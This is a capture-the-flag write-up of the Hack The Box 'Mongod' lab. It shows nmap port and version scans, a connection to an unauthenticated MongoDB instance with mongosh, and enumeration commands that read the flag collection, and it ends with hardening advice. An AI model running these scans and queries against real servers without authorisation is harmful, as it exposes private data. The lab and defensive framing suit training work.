Yooo guys, it's ju4dy the landlord again.

# Mongod — Hack The Box Starting Point

|  |  |
| --- | --- |
| **Platform** | Hack The Box — Starting Point |
| **Tier** | 0 |
| **Difficulty** | Very easy |
| **Operating system** | Linux |
| **Target IP** | `10.129.228.30` |
| **Skills** | Full port scanning, MongoDB, `mongosh`, unauthenticated database access |

## Overview

Mongod is a very easy Linux host that exposes a MongoDB instance on its default port. MongoDB allows
authentication to be enabled, but it does not require it: a deployment that never creates a user is readable,
and writable, by anyone who can reach the port. The box is a demonstration of that default.

The `mongosh` shell connects without credentials, lists the databases, and reads the collection that holds
the flag.

## Enumeration

A full TCP sweep is used first, because MongoDB does not sit on a port that a default scan would find quickly
and a complete picture is cheap at this speed:

```bash
sudo nmap -p- --min-rate 5000 -T4 -Pn 10.129.228.30 -oG all_ports.gnmap
```

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-14 10:14 +0100
Warning: 10.129.228.30 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.228.30
Host is up (0.43s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
27017/tcp open  mongod

Nmap done: 1 IP address (1 host up) scanned in 20.16 seconds
```

Two ports survive: SSH and `27017`, the MongoDB default. The retransmission warning is normal on a fast scan
against a lossy link; `-oG` keeps the port list in a greppable file for later reuse.

Version detection is then limited to the interesting port:

```bash
nmap -sV -p 27017 10.129.228.30
```

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-14 10:18 +0100
Nmap scan report for 10.129.228.30
Host is up (0.20s latency).

PORT      STATE SERVICE VERSION
27017/tcp open  mongodb MongoDB 3.6.8

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.83 seconds
```

## Exploitation — anonymous database access

`mongosh` is the current MongoDB shell and is installed from the official `.deb` package on Kali and Debian.
It connects to a host and port directly:

```bash
mongosh --host 10.129.228.30 --port 27017
```

The shell opens without asking for a user name or password, which is the finding: the instance has no
authentication configured. From there the database is enumerated with the usual commands:

```text
test> show dbs
test> use <database-name>
test> show collections
test> db.flag.find()
```

`show dbs` lists the databases the anonymous user can see; `use` switches to the one that looks relevant;
`show collections` lists its collections; and `db.flag.find()` returns every document in the collection named
`flag`, including the one holding the value for the box.

<!-- screenshot: db.flag.find() output with the flag document -->

The same exposure can be confirmed without a shell at all, which is useful when the client is not available:

```bash
nmap -p 27017 --script mongodb-databases 10.129.228.30
```

## Key takeaways

- **MongoDB is unauthenticated unless someone enables authentication.** Starting `mongod` with `--auth`, or
  creating the first user in the `admin` database, is the difference between a public database and a private
  one.
- **Bind to loopback unless remote access is required.** `bindIp: 127.0.0.1` in `mongod.conf` keeps the
  service off the network entirely; exposing `27017` should be a deliberate, firewalled decision.
- **Version `3.6.8` is long out of support.** An end-of-life database server receives no security patches,
  and the version banner advertises that fact to anyone who scans.
- **Databases hold business data, not just flags.** The same access that reads a flag collection would read
  customer records, so this is a data breach scenario rather than a lab curiosity.
- **Monitor authentication failures and connection sources.** An unauthenticated client from an unexpected
  address is visible in the server log and should alert.
